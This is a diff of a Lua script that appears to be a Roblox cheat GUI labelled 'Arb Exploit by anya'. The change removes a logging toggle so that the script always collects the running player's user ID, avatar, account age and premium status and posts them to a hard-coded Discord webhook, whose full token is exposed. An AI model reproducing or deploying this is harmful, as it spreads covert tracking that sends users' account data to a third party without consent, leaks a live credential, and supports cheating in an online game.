@@ -6,9 +6,6 @@
 88. ~8~ 88b  d88   .88.        j88.         88booo. 88b  d88 88   88 
  Y888P  ~Y8888P' Y888888P      888888D      Y88888P ~Y8888P' YP   YP  CONVERTER
 ]=]
-
-getgenv().log = true
-if log == true then
 local Webhook = "https://discord.com/api/webhooks/1191422032039116980/9DW38LUNa9eRdzdTcBkm4GUrvxZqNbEwxV6tun-uoLNko7F4jp9ghbtImFUDG96XIGGs"
 _G.Discord_UserID = "شخص شغل الهاك يا انيا"
 
@@ -27,7 +24,7 @@ elseif premium and player.AccountAge >= 70 then
    alt = false
 end
 
-local executor = "Arb Exploit by anya" or "Unknown"
+local executor = "Arb Exploit by anya"
 local Thing = game:HttpGet(string.format("https://thumbnails.roblox.com/v1/users/avatar?userIds=%d&size=180x180&format=Png&isCircular=true", game.Players.LocalPlayer.UserId))
 Thing = game:GetService("HttpService"):JSONDecode(Thing).data[1]
 local AvatarImage = Thing.imageUrl
@@ -93,13 +90,8 @@ local msg = {
        }
    }
 }
-
-print("nil")
-    else
     request = http_request or request or HttpPost or syn.request
     request({Url = Webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = game.HttpService:JSONEncode(msg)})
-log = false
-
 -- Instances: 275 | Scripts: 9 | Modules: 0
 local G2L = {};
 
